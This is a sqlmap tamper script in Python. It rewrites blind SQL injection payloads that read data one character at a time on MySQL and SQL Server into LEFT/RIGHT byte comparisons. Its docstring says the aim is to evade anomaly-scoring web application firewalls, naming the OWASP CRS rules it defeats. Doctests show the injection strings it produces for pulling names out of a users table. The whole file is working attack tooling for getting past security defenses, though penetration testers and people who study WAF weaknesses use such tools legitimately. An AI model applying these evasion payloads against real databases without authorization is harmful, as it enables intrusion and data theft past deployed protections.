#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.common import Backend
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def _balancedEnd(payload, start):
    """Index of the ')' matching the '(' at payload[start] (or -1)."""
    depth = 0
    idx = start
    while idx < len(payload):
        if payload[idx] == '(':
            depth += 1
        elif payload[idx] == ')':
            depth -= 1
            if depth == 0:
                return idx
        idx += 1
    return -1

def _unwrapIsnull(query):
    """Rewrites sqlmap's MySQL NULL wrapper 'IFNULL(<x>,<y>)' into '(IF(<x> IS NULL,<y>,<x>))'."""
    retVal = query

    while True:
        match = re.search(r"(?i)IFNULL\(", retVal)

        if not match:
            break

        end = _balancedEnd(retVal, match.end() - 1)
        if end < 0:
            break

        inner = retVal[match.end():end]
        separator, depth = -1, 0     # the argument separator is the comma at the top level

        for index, char in enumerate(inner):
            if char == '(':
                depth += 1
            elif char == ')':
                depth -= 1
            elif char == ',' and depth == 0:
                separator = index

        if separator < 1:
            break

        field, default = inner[:separator], inner[separator + 1:]
        retVal = "%s(IF(%s IS NULL,%s,%s))%s" % (retVal[:match.start()], field, default, field, retVal[end + 1:])

    return retVal

def _reshape(payload, opener, tail, build):
    """Replace every 'opener(<balanced query>)<tail>' with build(query, tail-match)."""
    retVal = payload
    pos = 0
    while True:
        match = re.search(opener, retVal[pos:])
        if not match:
            break
        start = pos + match.start()
        cursor = pos + match.end()                  # should sit on the '(' of the query argument
        if cursor >= len(retVal) or retVal[cursor] != '(':
            pos = pos + match.end()
            continue
        end = _balancedEnd(retVal, cursor)
        if end < 0:
            pos = pos + match.end()
            continue
        query = retVal[cursor:end + 1]              # '(<query>)'
        rest = re.match(tail, retVal[end + 1:])
        if not rest:
            pos = pos + match.end()
            continue
        replacement = build(query, rest)

        if replacement is None:                     # builder declined, leave this occurrence alone
            pos = pos + match.end()
            continue

        retVal = retVal[:start] + replacement + retVal[end + 1 + rest.end():]
        pos = start + len(replacement)
    return retVal

def tamper(payload, **kwargs):
    """
    Rewrites blind single-character reads into a firewall-transparent, byte-ordered comparison that
    sheds the function names anomaly-scoring WAFs key on:

      * MySQL:      ORD(MID((<q>),<p>,1))><n>
                 -> RIGHT(LEFT((<q>),<p>),(<p><=LENGTH(CONVERT((<q>) USING ascii))))>BINARY 0x<nn>
      * SQL Server: UNICODE(SUBSTRING((<q>),<p>,1))><n>   (also ASCII(SUBSTRING(...)))
                 -> CAST(RIGHT(LEFT((<q>),<p>),CASE WHEN <p><=LEN((<q>)) THEN 1 ELSE 0 END) AS VARBINARY)>0x<nn>

    Requirement:
        * MySQL or Microsoft SQL Server

    Notes:
        * Bypasses anomaly-scoring WAFs (e.g. OWASP CRS) that score the function names
          ORD/MID/ASCII/SUBSTRING/UNICODE (rule 942151) and the function-comparison shape (942190).
          LEFT/RIGHT are not in those blocklists, so the cumulative score collapses (often to 0) while
          the single-character, byte-ordered semantics of the bisection are preserved.
        * On MySQL the character count runs over an ASCII copy of the value (one character, one byte),
          because CHAR_LENGTH() is blacklisted by the very same rule, and the NULL wrapper IFNULL() is
          rewritten to IF(). Counting bytes of the original instead would run past the end of a
          multi-byte value, and a bare 'SELECT IF(' would be scored by rule 942170.
        * MySQL 'BINARY' / SQL Server '... AS VARBINARY' force a byte (case- and accent-sensitive)
          comparison, so extraction stays exact under a case-insensitive default collation. Both use a
          native hex literal (0x<nn>), so nothing needs string-escaping.
        * The character count is guarded (1 inside the string, 0 past its end), so a position beyond the
          end yields RIGHT(...,0)='' which compares below every byte - the NULL terminator that stops
          extraction, exactly like the original. A constant 1 would keep returning the last character
          forever and never terminate.

    >>> tamper('1 AND ORD(MID((SELECT IFNULL(CAST(name AS NCHAR),0x20) FROM users ORDER BY id LIMIT 0,1),5,1))>71')
    '1 AND RIGHT(LEFT((SELECT (IF(CAST(name AS NCHAR) IS NULL,0x20,CAST(name AS NCHAR))) FROM users ORDER BY id LIMIT 0,1),5),(5<=LENGTH(CONVERT((SELECT (IF(CAST(name AS NCHAR) IS NULL,0x20,CAST(name AS NCHAR))) FROM users ORDER BY id LIMIT 0,1) USING ascii))))>BINARY 0x47'
    >>> tamper('1 AND ORD(MID((SELECT 1),1,1))>0')
    '1 AND RIGHT(LEFT((SELECT 1),1),(1<=LENGTH(CONVERT((SELECT 1) USING ascii))))>BINARY 0x00'
    >>> tamper('1 AND ORD(MID((SELECT 1),1,1)) IN (65,66,0)')
    "1 AND BINARY RIGHT(LEFT((SELECT 1),1),(1<=LENGTH(CONVERT((SELECT 1) USING ascii)))) IN (0x41,0x42,'')"
    >>> tamper('1 AND 5141=5141')
    '1 AND 5141=5141'
    >>> tamper('1 AND ORD(MID((SELECT 1),1,1))<65')
    '1 AND RIGHT(LEFT((SELECT 1),1),(1<=LENGTH(CONVERT((SELECT 1) USING ascii))))<BINARY 0x41'
    >>> tamper('1 AND UNICODE(SUBSTRING((SELECT TOP 1 name FROM users),3,1))>64')
    '1 AND CAST(RIGHT(LEFT((SELECT TOP 1 name FROM users),3),CASE WHEN 3<=LEN((SELECT TOP 1 name FROM users)) THEN 1 ELSE 0 END) AS VARBINARY)>0x40'
    """

    if not payload:
        return payload

    def _mysql(query, rest):
        position, operator, value = rest.group(1), rest.group(2), int(rest.group(3))
        query = _unwrapIsnull(query)
        return "RIGHT(LEFT(%s,%s),(%s<=LENGTH(CONVERT(%s USING ascii))))%sBINARY 0x%02x" % (query, position, position, query, operator, value)

    def _mysqlSet(query, rest):
        # set-membership form of the same read ('... IN (<ordinals>)', used by the Huffman retrieval).
        # ORD('') is 0, so a past-the-end position matches the ordinal 0, which is the empty string here
        position = rest.group(1)
        ordinals = [int(_) for _ in rest.group(2).split(',') if _.strip().isdigit()]

        if not ordinals or any(_ > 255 for _ in ordinals):      # a byte comparison cannot represent those
            return None

        query = _unwrapIsnull(query)
        members = ",".join("''" if _ == 0 else "0x%02x" % _ for _ in ordinals)
        return "BINARY RIGHT(LEFT(%s,%s),(%s<=LENGTH(CONVERT(%s USING ascii)))) IN (%s)" % (query, position, position, query, members)

    def _mssql(query, rest):
        position, operator, value = rest.group(1), rest.group(2), int(rest.group(3))
        # shed sqlmap's SQL Server retrieval wrapper 'ISNULL(CAST(<x> AS NVARCHAR(<n>)),CHAR(<m>))' -> '(<x>)':
        # CHAR()/CAST are themselves scored by ASCII/SUBSTRING-class WAFs (unlike MySQL's 0x20 hex), so for a
        # clean inner query the whole read goes function-free (NULLs then read as end-of-string)
        query = re.sub(r"(?i)ISNULL\(CAST\((.+?) AS NVARCHAR\(\d+\)\),\s*CHAR\(\d+\)\)", r"(\1)", query)
        return "CAST(RIGHT(LEFT(%s,%s),CASE WHEN %s<=LEN(%s) THEN 1 ELSE 0 END) AS VARBINARY)%s0x%02x" % (query, position, position, query, operator, value)

    comma_tail = r"\s*,\s*(\d+)\s*,\s*1\)\)\s*(>=|<=|>|<|=)\s*(\d+)"
    set_tail = r"\s*,\s*(\d+)\s*,\s*1\)\)\s+IN\s*\(([\d,\s]+)\)"

    # also on payloads that are not single-character reads. Gated on MySQL, because IFNULL() is used
    # by H2, HSQLDB, Cubrid and others too, and IF() is not a function there
    if Backend.getIdentifiedDbms() == DBMS.MYSQL and re.search(r"(?i)IFNULL\(", payload):
        payload = _unwrapIsnull(payload)

    retVal = _reshape(payload, r"(?i)ORD\(MID\(", set_tail, _mysqlSet)
    retVal = _reshape(retVal, r"(?i)ORD\(MID\(", comma_tail, _mysql)
    retVal = _reshape(retVal, r"(?i)(?:UNICODE|ASCII)\(SUBSTRING\(", comma_tail, _mssql)
    return retVal
